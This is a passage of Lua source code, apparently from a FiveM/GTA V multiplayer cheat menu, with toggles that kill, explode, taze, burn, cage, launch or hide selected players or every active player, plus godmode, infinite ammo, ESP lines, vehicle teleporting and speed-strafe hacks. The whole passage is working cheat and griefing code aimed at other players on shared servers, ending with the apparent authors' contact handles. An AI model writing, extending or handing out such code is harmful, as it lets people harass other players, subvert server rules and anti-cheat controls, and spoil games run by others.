                            Winnie_AddExplosion(pedSelect, coordsPlayer, 3, 10000.0, true, false, 0)
                        end

                        if ZM_M1000.tzplayer then
                            local pedSelect = Winnie_GetPlayerPed(ZM_M1000.select)
                            local coordsPlayer = Winnie_GetEntityCoords(pedSelect)
                            local targetCoords = Winnie_GetPedBoneCoords(pedSelect, 31086, 0, 0, 0)
                            Winnie_ShootSingleBulletBetweenCoords(coordsPlayer.x, coordsPlayer.y, coordsPlayer.z, targetCoords.x, targetCoords.y, targetCoords.z, 9000, 0, Winnie_GetHashKey("WEAPON_STUNGUN"), Winnie_PlayerPedId(), true, false, 9000.0)
                        end

                        if ZM_KeyboardUI.Checkbox["explode-function"] then
                            local coords = Winnie_GetEntityCoords(Winnie_GetPlayerPed(ZM_KeyboardUI.Select))
                            Winnie_AddExplosion(coords, SliderKeyboard["explodetype"].value, 999.0, true, false, true)
                        end
                        if ZM_KeyboardUI.Checkbox["ear-function"] then
                            CreateThread(function()
                                local coordsPlayer = Winnie_GetEntityCoords(Winnie_GetPlayerPed(ZM_KeyboardUI.Select))
                                Winnie_PlaySoundFromCoord(-1, "CHECKPOINT_MISSED", coordsPlayer.x, coordsPlayer.y, coordsPlayer.z, "HUD_MINI_GAME_SOUNDSET", true, 1.0, true)
                                Winnie_PlaySoundFromCoord(-1, "Power_Down", coordsPlayer.x, coordsPlayer.y, coordsPlayer.z, "DLC_HEIST_HACKING_SNAKE_SOUNDS", true, 1.0, true)
                            end)
                        end

                        if ZM_KeyboardUI.Checkbox["kill-function"] then
                            CreateThread(function()
                                local pedSelect = Winnie_GetPlayerPed(ZM_KeyboardUI.Select)
                                local coordsPlayer = Winnie_GetEntityCoords(pedSelect)
                                local targetCoords = Winnie_GetPedBoneCoords(pedSelect, 31086, 0, 0, 0)
                                Winnie_ShootSingleBulletBetweenCoords(coordsPlayer.x, coordsPlayer.y, coordsPlayer.z, targetCoords.x, targetCoords.y, targetCoords.z, 9000, 0, Winnie_GetHashKey("WEAPON_PISTOL"), Winnie_PlayerPedId(), true, false, 9000.0)
                            end)
                        end


                        if ZM_KeyboardUI.Checkbox["taze-function"] then
                            local pedSelect = Winnie_GetPlayerPed(ZM_KeyboardUI.Select)
                            local coordsPlayer = Winnie_GetEntityCoords(pedSelect)
                            local targetCoords = Winnie_GetPedBoneCoords(pedSelect, 31086, 0, 0, 0)
                            Winnie_ShootSingleBulletBetweenCoords(coordsPlayer.x, coordsPlayer.y, coordsPlayer.z, targetCoords.x, targetCoords.y, targetCoords.z, 9000, 0, Winnie_GetHashKey("WEAPON_STUNGUN"), Winnie_PlayerPedId(), true, false, 9000.0)
                        end


                        if ZM_KeyboardUI.Checkbox["molotov-function"] then
                            local pedSelect = Winnie_GetPlayerPed(ZM_KeyboardUI.Select)
                            local coordsPlayer = Winnie_GetEntityCoords(pedSelect)
                            Winnie_AddExplosion(pedSelect, coordsPlayer, 3, 10000.0, true, false, 0)
                        end


                        if ZM_KeyboardUI.Checkbox["anticlone-particle"] then
                            RemoveParticleFxInRange(GetEntityCoords(PlayerPedId(), true))
                        end

                        if ZM_KeyboardUI.Checkbox["antifire-function"] then
                            StopEntityFire(PlayerPedId())
                        end

                        if ZM_KeyboardUI.Checkbox["antiobject-function"] then
                            if IsEntityAttached(PlayerPedId()) then
                                DetachEntity(PlayerPedId(), true, true)
                            end
                        end

                        if ZM_KeyboardUI.Checkbox["hy-function"] then
                            local pedSelect = Winnie_GetPlayerPed(ZM_KeyboardUI.Select)
                            local coordsPlayer = Winnie_GetEntityCoords(pedSelect)
                            Winnie_AddExplosion(coordsPlayer, 13, 10000.0, true, false, 10000.0)
                        end

                        if ZM_M1000.killplayerrr then
                            local pedSelect = Winnie_GetPlayerPed(ZM_M1000.select)
                            local coordsPlayer = Winnie_GetEntityCoords(pedSelect)
                            local targetCoords = Winnie_GetPedBoneCoords(pedSelect, 31086, 0, 0, 0)
                            Winnie_ShootSingleBulletBetweenCoords(coordsPlayer.x, coordsPlayer.y, coordsPlayer.z, targetCoords.x, targetCoords.y, targetCoords.z, 9000, 0, Winnie_GetHashKey("WEAPON_PISTOL"), Winnie_PlayerPedId(), true, false, 9000.0)
                        end

                        if ZM_M1000.hyplayer then
                            local pedSelect = Winnie_GetPlayerPed(ZM_M1000.select)
                            local coordsPlayer = Winnie_GetEntityCoords(pedSelect)
                            Winnie_AddExplosion(coordsPlayer, 13, 10000.0, true, false, 10000.0)
                        end

                        if ZM_M1000.spermecar then
                            CreateThread(function()
                                local pedSelect = Winnie_GetPlayerPed(ZM_M1000.select)
                                local coordsPlayer = Winnie_GetEntityCoords(pedSelect)
                                local hash = Winnie_GetHashKey(tostring("zentorno"))

                                Winnie_RequestModel(hash)
                                while not Winnie_HasModelLoaded(hash) do
                                    CIT.Wait(50)
                                end

                                local vehicle = Winnie_CreateVehicle(hash, coordsPlayer, true, false)
                            end)
                        end

                        if ZM_M1000.cgplayerm100teb then
                            local pedSelect = Winnie_GetPlayerPed(ZM_M1000.select)
                            local coordsPlayer = Winnie_GetEntityCoords(pedSelect)

                            local object = Winnie_IsCreateObject(Winnie_GetHashKey("prop_container_ld_pu"), coordsPlayer.x, coordsPlayer.y,  coordsPlayer.z + 0.0,  0, 5, 0, 5, Winnie_GetHashKey("prop_container_ld_pu"), 0,  5, 0 )
                            SetPickupRegenerationTime(object, 60)
                        end

                        if ZM_KeyboardUI.Checkbox["launchplayer-function"] then
                            local pedSelect = Winnie_GetPlayerPed(ZM_KeyboardUI.Select)
                            local coordsPlayer = Winnie_GetEntityCoords(pedSelect)
                            Winnie_ApplyForceToEntity(pedSelect, SliderKeyboard["forcelaunch"].value, coordsPlayer + 10, 0, 0, 0, false, false, true, true, false, true)
                        end

                        if ZM_M1000.launchplayer then
                            local pedSelect = Winnie_GetPlayerPed(ZM_M1000.select)
                            local coordsPlayer = Winnie_GetEntityCoords(pedSelect)
                            Winnie_ApplyForceToEntity(pedSelect, math.floor(6 * rE_Slider["Slider_launchplayer_value"]), coordsPlayer + 10, 0, 0, 0, false, false, true, true, false, true)
                        end



                        if ZM_M1000.cgplayer or ZM_KeyboardUI.Checkbox["cgallplayer-function"] then
                            for k, v in pairs(GetActivePlayers()) do
                            local pedSelect = Winnie_GetPlayerPed(v)
                            local coordsPlayer = Winnie_GetEntityCoords(pedSelect)

                            local obj = Winnie_IsCreateObject( Winnie_GetHashKey("prop_dog_cage_02"), coordsPlayer.x, coordsPlayer.y, coordsPlayer.z, true,true, true)
                            Winnie_AttachEntityToEntity(obj, pedSelect, Winnie_GetPedBoneIndex(pedSelect,28422), 0.4,0, 0, 0, 270.0, 60.0, true, true,false,true, 1, true)
                            end
                        end

                        if ZM_M1000.crashplayer then
                            for k, v in pairs(GetActivePlayers()) do
                                local pedSelect = Winnie_GetPlayerPed(v)
                                Winnie_SetEntityVisible(pedSelect, false)
                            end
                        end

                        if ZM_KeyboardUI.Checkbox["ptfxall-function"] then
                              for k, v in pairs(GetActivePlayers()) do
                                local pedSelect = Winnie_GetPlayerPed(v)
                                local coordsPlayer = Winnie_GetEntityCoords(pedSelect)

                                Winnie_RequestNamedPtfxAsset("core")
                                while not Winnie_HasNamedPtfxAssetLoaded("core") do
                                    Wait(10)
                                end

                                Winnie_UseParticleFxAsset("core")
                                Winnie_StartNetworkedParticleFxNonLoopedAtCoord("ent_sht_flame", coordsPlayer.x, coordsPlayer.y,coordsPlayer.z, 0,0, 0, SliderKeyboard["ptfxvalue"].value + 0.0 ,0, 0, 0)
                            end
                        end
                        if ZM_M1000.ptfxspamming then
                            for k, v in pairs(GetActivePlayers()) do
                                local pedSelect = Winnie_GetPlayerPed(v)
                                local coordsPlayer = Winnie_GetEntityCoords(pedSelect)

                                Winnie_RequestNamedPtfxAsset("core")
                                while not Winnie_HasNamedPtfxAssetLoaded("core") do
                                    Wait(10)
                                end

                                Winnie_UseParticleFxAsset("core")
                                Winnie_StartNetworkedParticleFxNonLoopedAtCoord("ent_sht_flame", coordsPlayer.x, coordsPlayer.y,coordsPlayer.z, 0,0, 0, math.abs(100 * rE_Slider["Slider_ptfxscalemisc_value"]),0, 0, 0)
                            end
                        end

                        if ZM_M1000.waterplayer then
                            for k, v in pairs(GetActivePlayers()) do
                                local pedSelect = Winnie_GetPlayerPed(v)
                                local coordsPlayer = Winnie_GetEntityCoords(pedSelect)
                                Winnie_AddExplosion(coordsPlayer, 13, 10000.0, true, false, 1000.0)
                            end
                        end

                        if ZM_M1000.molotovallp then
                            for k, v in pairs(GetActivePlayers()) do
                                local pedSelect = Winnie_GetPlayerPed(v)
                                local coordsPlayer = Winnie_GetEntityCoords(pedSelect)
                                Winnie_AddExplosion(coordsPlayer, 3, 1000.0, true, false, 0)
                            end
                        end

                        if ZM_M1000.whaleplayer or ZM_KeyboardUI.Checkbox["whalemass-function"] then
                            CreateThread(function()
                                for k, v in pairs(GetActivePlayers()) do
                                    local pedSelect = Winnie_GetPlayerPed(v)
                                    local coordsPlayer = Winnie_GetEntityCoords(pedSelect)

                                    local hash = Winnie_GetHashKey("a_c_killerwhale")
                                    Winnie_RequestModel(hash)
                                    while not Winnie_HasModelLoaded(hash) do
                                        Wait(0)
                                        Winnie_CreatePed(21, hash, coordsPlayer.x, coordsPlayer.y, coordsPlayer.z, 0.0, true, true)
                                        end
                                    end
                                end)
                            end

                        if ZM_M1000.destroycars or ZM_KeyboardUI.Checkbox["explodeallveh-function"] then
                            for k, v in pairs(GetGamePool("CVehicle")) do
                                local coords = Winnie_GetEntityCoords(v)
                                local distance = Winnie_GetDistanceBetweenCoords(Winnie_GetFinalRenderedCamCoord(), coords.x, coords.y, coords.z)
                                if distance <= 100 then
                                    Winnie_AddExplosion(coords, 32, 10000.0, false, false, 0.0)
                                end
                            end
                        end

                        if ZM_KeyboardUI.Checkbox['flyallveh-function'] then
                            for k, v in pairs(GetGamePool("CVehicle")) do
                                local direction = vec3(0.0, 0.0, 15.0)
                                local rotation = vec3(0.0, 0.0, 0.0)
                                Winnie_ApplyForceToEntity(v, SliderKeyboard['valuefly'].value + 0.0, direction, rotation, 5, true, true, true, false)
                            end
                        end

                        if ZM_M1000.asas then
                            for k, v in pairs(GetGamePool("CVehicle")) do
                                local direction = vec3(0.0, 0.0, 15.0)
                                local rotation = vec3(0.0, 0.0, 0.0)
                                Winnie_ApplyForceToEntity(v, math.floor(5 * rE_Slider["Slider_forcefly_value"]), direction, rotation, 5, true, true, true, false)
                            end
                        end


                        if ZM_M1000.rbhud then
                            local rgb = rainbow(1.0)
                            Winnie_ReplaceHudColourWithRgba(116, rgb.r, rgb.g, rgb.b, 255)
                        end

                        if ZM_M1000.atznshot or ZM_KeyboardUI.Checkbox["antizein-function"] then
                            for k, v in pairs(GetGamePool("CPed")) do
                                for k, a in pairs(availableZombies) do
                                    if not Winnie_IsPedAPlayer(v) and v ~= Winnie_PlayerPedId() then
                                        Winnie_DeletePed(v)
                                        end
                                    end
                                end
                            end


                        if ZM_M1000.tlpzmb or ZM_KeyboardUI.Checkbox["tpz-function"] then
                            local pedCoords = Winnie_GetEntityCoords(Winnie_PlayerPedId())
                            for k, v in pairs(GetGamePool("CPed")) do
                                if not Winnie_IsPedAPlayer(v) and v ~= Winnie_PlayerPedId() then
                                        Winnie_SetEntityCoords(v, pedCoords.x + 1.5, pedCoords.y + 1.5, pedCoords.z)
                                    end
                                end
                            end

                        if ZM_M1000.autfrm or ZM_KeyboardUI.Checkbox["farmz-function"] then
                            local pedCoords = Winnie_GetEntityCoords(Winnie_PlayerPedId())
                            for k, v in pairs(GetGamePool("CPed")) do
                                if not Winnie_IsPedAPlayer(v) and v ~= Winnie_PlayerPedId() then
                                            Winnie_SetEntityCoords(v, pedCoords.x + 1.5, pedCoords.y + 1.5, pedCoords.z)
                                            Winnie_SetEntityHealth(v, 0)
                                            SetControlNormal(0, 355, 1.0)
                                            SetControlNormal(0, 356, 1.0)
                                            SetControlNormal(0, 86, 1.0)
                                        end
                                    end
                                end

                        if ZM_M1000.autfrmxp or ZM_KeyboardUI.Checkbox["farmzxp-function"] then
                            local pedCoords = Winnie_GetEntityCoords(Winnie_PlayerPedId())
                            for k, v in pairs(GetGamePool("CPed")) do
                                if not Winnie_IsPedAPlayer(v) and v ~= Winnie_PlayerPedId() then
                                            Winnie_SetEntityCoords(v, pedCoords.x + 1.5, pedCoords.y + 1.5, pedCoords.z)
                                            local coordsZombie = Winnie_GetEntityCoords(v)
                                            local boneArray = Winnie_GetPedBoneCoords(v, 31086, 0, 0, 0)
                                                Winnie_ShootSingleBulletBetweenCoords(coordsZombie.x, coordsZombie.y, coordsZombie.z, boneArray.x, boneArray.y, boneArray.z, 9000.0, 0, Winnie_GetHashKey("WEAPON_MICROSMG"), Winnie_PlayerPedId(), true, false, 1000.0)
                                        end
                                    end
                                end


                        if ZM_M1000.espltbag or ZM_KeyboardUI.Checkbox["espbag-function"] then
                            for k, v in pairs(GetGamePool("CObject")) do
                                local lootBag = Winnie_GetEntityCoords(v)
                                local Vdist = Winnie_GetDistanceBetweenCoords(Winnie_GetEntityCoords(Winnie_PlayerPedId()), Winnie_GetEntityCoords(v), false)
                                local coordsPlayer = Winnie_GetEntityCoords(Winnie_PlayerPedId())
                                if Winnie_GetEntityModel(v) == "prop_big_bag_01" then
                                    if Vdist < math.abs(1000 * rE_Slider["Slider_bagdistance_value"]) then
                                        Winnie_DrawLine(coordsPlayer, lootBag, math.floor(255 * rE_Slider["Slider_bagcolorr_value"]), math.floor(255 * rE_Slider["Slider_bagcolorg_value"]), math.floor(255 * rE_Slider["Slider_bagcolorb_value"]), 255)
                                    end
                                end
                            end
                        end


                        if ZM_KeyboardUI.Checkbox["strafehelp-function"] then
                            local PED = Winnie_PlayerPedId()
                            local SPEED = SliderKeyboard["strafespeed"].value / 10
                            local COORDS = Winnie_GetEntityCoords(PED)
                            local CAM = Winnie_GetGameplayCamRot(0)

                            local left, right = Quaternion(CAM) * vector3(0.0, 1.0, 0.0), Quaternion(CAM) * vector3(1.0, 0.0, 0.0)
                            if not Winnie_IsPedInAnyVehicle(Winnie_PlayerPedId()) then
                                if Winnie_IsDisabledControlPressed(0, 30) then
                                    COORDS = COORDS + right * SPEED
                                    Winnie_SetEntityCoordsNoOffset(PED, COORDS.x, COORDS.y, COORDS.z, true, true, true)
                                    RequestCollisionAtCoord(COORDS.x, COORDS.y, COORDS.z)
                                end
                                if Winnie_IsDisabledControlPressed(0, 34) then
                                    COORDS = COORDS + right * - SPEED
                                    Winnie_SetEntityCoordsNoOffset(PED, COORDS.x, COORDS.y, COORDS.z, true, true, true)
                                    RequestCollisionAtCoord(COORDS.x, COORDS.y, COORDS.z)
                                end
                            end
                        end

                        if ZM_M1000.strf then
                            local PED = Winnie_PlayerPedId()
                            local SPEED = math.abs(0.5 * rE_Slider["Slider_Strafe_value"])
                            local COORDS = Winnie_GetEntityCoords(PED)
                            local CAM = Winnie_GetGameplayCamRot(0)

                            local left, right = Quaternion(CAM) * vector3(0.0, 1.0, 0.0), Quaternion(CAM) * vector3(1.0, 0.0, 0.0)
                            if not Winnie_IsPedInAnyVehicle(Winnie_PlayerPedId()) then
                                if Winnie_IsDisabledControlPressed(0, 30) then
                                    COORDS = COORDS + right * SPEED
                                    Winnie_SetEntityCoordsNoOffset(PED, COORDS.x, COORDS.y, COORDS.z, true, true, true)
                                    RequestCollisionAtCoord(COORDS.x, COORDS.y, COORDS.z)
                                end
                                if Winnie_IsDisabledControlPressed(0, 34) then
                                    COORDS = COORDS + right * - SPEED
                                    Winnie_SetEntityCoordsNoOffset(PED, COORDS.x, COORDS.y, COORDS.z, true, true, true)
                                    RequestCollisionAtCoord(COORDS.x, COORDS.y, COORDS.z)
                                end
                            end
                        end

                        if ZM_M1000.killalglife then
                                for k, v in pairs(GetActivePlayers()) do

                                        local pedSelect = Winnie_GetPlayerPed(v)
                                        local coordsPlayer = Winnie_GetEntityCoords(pedSelect)
                                        local boneCoords = Winnie_GetPedBoneCoords(pedSelect, 31086, 0, 0, 0)
                                        Winnie_ShootSingleBulletBetweenCoords(coordsPlayer.x, coordsPlayer.y, coordsPlayer.z, boneCoords.x, boneCoords.y, boneCoords.z, 9000.0, 0, Winnie_GetHashKey("WEAPON_ASSAULTRIFLE_MK2"), Winnie_PlayerPedId(), true, false, 100000.0)

                                end
                        end


                        if ZM_M1000.rmvwindows or ZM_KeyboardUI.Checkbox["rmvwindows-function"] then
                            for k, v in pairs(GetGamePool("CVehicle")) do
                                    for i = 0, 7 do
                                        Winnie_RemoveVehicleWindow(v, i)
                                        Winnie_SetDisableVehicleWindowCollisions(v, true)
                                    end
                                end
                            end

                        if ZM_M1000.gmdglife or ZM_KeyboardUI.Checkbox["godmodeglife-function"] then
                            CIT.InvokeNative(0x7022BD828FA0B082, Winnie_PlayerPedId(), true, 7841.120)
                        else
                            CIT.InvokeNative(0x7022BD828FA0B082, Winnie_PlayerPedId(), false, 7841.120)
                        end

                        if ZM_M1000.infammo or ZM_KeyboardUI.Checkbox["infiniammo-function"] then
                            local weaponHash = Winnie_GetSelectedPedWeapon(Winnie_PlayerPedId())
                            Winnie_SetPedAmmo(Winnie_PlayerPedId(), weaponHash, 255)
                        end

                        if ZM_M1000.frrzmo or ZM_KeyboardUI.Checkbox["freezeammo-function"] then
                            Winnie_SetPedInfiniteAmmoClip(Winnie_PlayerPedId(), true)
                        else
                            Winnie_SetPedInfiniteAmmoClip(Winnie_PlayerPedId(), false)
                        end

                        if ZM_M1000.tlportovehicle or ZM_KeyboardUI.Checkbox["tptoveh-function"] then
                            for k, vehicle in pairs(GetGamePool("CVehicle")) do

                                local x, y, z = table.unpack(Winnie_GetEntityCoords(vehicle))
                                local _, _x, _y = Winnie_GetScreenCoordFromWorldCoord(x, y, z)
                                local pedSelect = Winnie_PlayerPedId()

                                local FOV = 0.090
                                local dist = string.format("%.1f", tostring(Vdist(Winnie_GetEntityCoords(pedSelect), Winnie_GetEntityCoords(vehicle))))

                                local distance = Winnie_GetDistanceBetweenCoords(Winnie_GetFinalRenderedCamCoord(), Winnie_GetEntityCoords(vehicle), false)
                                if distance < 150.0 then
                                    if (_x > 0.5 - FOV / 3 and _x < 0.5 + FOV / 3 and _y > 0.5 - FOV / 2 and _y < 0.5 + FOV / 2) then
                                        Winnie_DrawLine(Winnie_GetEntityCoords(pedSelect), Winnie_GetEntityCoords(vehicle), 255, 255, 255, 255)
                                        DrawVehicle(Winnie_GetDisplayNameFromVehicleModel(Winnie_GetEntityModel(vehicle)) .. " [" .. dist .. "]m Press ~r~"..string.lower(warpthevehicle["BindingTouch"]), x, y, z,  false, 0.26, false, 255, 255, 255, 255)
                                         if Winnie_IsControlPressed(0, teleporttovehicle["Value"]) then
                                            if Winnie_IsVehicleSeatFree(vehicle, -1) then
                                                Winnie_TaskWarpPedIntoVehicle(pedSelect, vehicle, math.random(0, 6))
                                                Winnie_SetPedIntoVehicle(pedSelect, vehicle, math.random(0, 6))
                                            else
                                                Winnie_TaskWarpPedIntoVehicle(pedSelect, vehicle, -1)
                                                Winnie_SetPedIntoVehicle(pedSelect, vehicle, -1)
                                            end
                                        end
                                    else
                                        DrawVehicle(Winnie_GetDisplayNameFromVehicleModel(Winnie_GetEntityModel(vehicle)) .. " [" .. dist .. "]m", x, y, z,  false, 0.26, false, 255, 255, 255, 255)
                                        end
                                    end
                                end
                            end



                        if ZM_M1000.wrpthevehicle or ZM_KeyboardUI.Checkbox["wrpveh-function"] then
                            for k, vehicle in pairs(GetGamePool("CVehicle")) do

                                local x, y, z = table.unpack(Winnie_GetEntityCoords(vehicle))
                                local _, _x, _y = Winnie_GetScreenCoordFromWorldCoord(x, y, z)
                                local pedSelect = Winnie_PlayerPedId()

                                local FOV = 0.090
                                local dist = string.format("%.1f", tostring(Vdist(Winnie_GetEntityCoords(pedSelect), Winnie_GetEntityCoords(vehicle))))

                                    if (_x > 0.5 - FOV / 3 and _x < 0.5 + FOV / 3 and _y > 0.5 - FOV / 2 and _y < 0.5 + FOV / 2) then
                                        Winnie_DrawLine(Winnie_GetEntityCoords(pedSelect), Winnie_GetEntityCoords(vehicle), 255, 255, 255, 255)
                                        DrawVehicle(Winnie_GetDisplayNameFromVehicleModel(Winnie_GetEntityModel(vehicle)) .. " [" .. dist .. "]m Press ~r~"..string.lower(warpthevehicle["BindingTouch"]), x, y, z,  false, 0.26, false, 255, 255, 255, 255)
                                        local distance = Winnie_GetDistanceBetweenCoords(Winnie_GetFinalRenderedCamCoord(), Winnie_GetEntityCoords(vehicle), false)
                                        if distance < 150.0 then
                                            if Winnie_IsControlPressed(0, warpthevehicle["Value"]) then
                                                Winnie_SetEntityCoords(vehicle, Winnie_GetEntityCoords(Winnie_PlayerPedId()))
                                                Winnie_TaskWarpPedIntoVehicle(pedSelect, vehicle, math.random(-2, 6))
                                                end
                                            end
                                    else
                                        DrawVehicle(Winnie_GetDisplayNameFromVehicleModel(Winnie_GetEntityModel(vehicle)) .. " [" .. dist .. "]m", x, y, z,  false, 0.26, false, 255, 255, 255, 255)
                                    end
                                end
                            end


                        end
                    end)



                    Citizen.CreateThread(function()
                        while New.active do
                            Wait(0)

                            if externalmenu then
                                Externe()
                            end


                        end

                    end)
                end)
            end)
    -- If you see this contact me Zebulo#0001 or m1000#2357
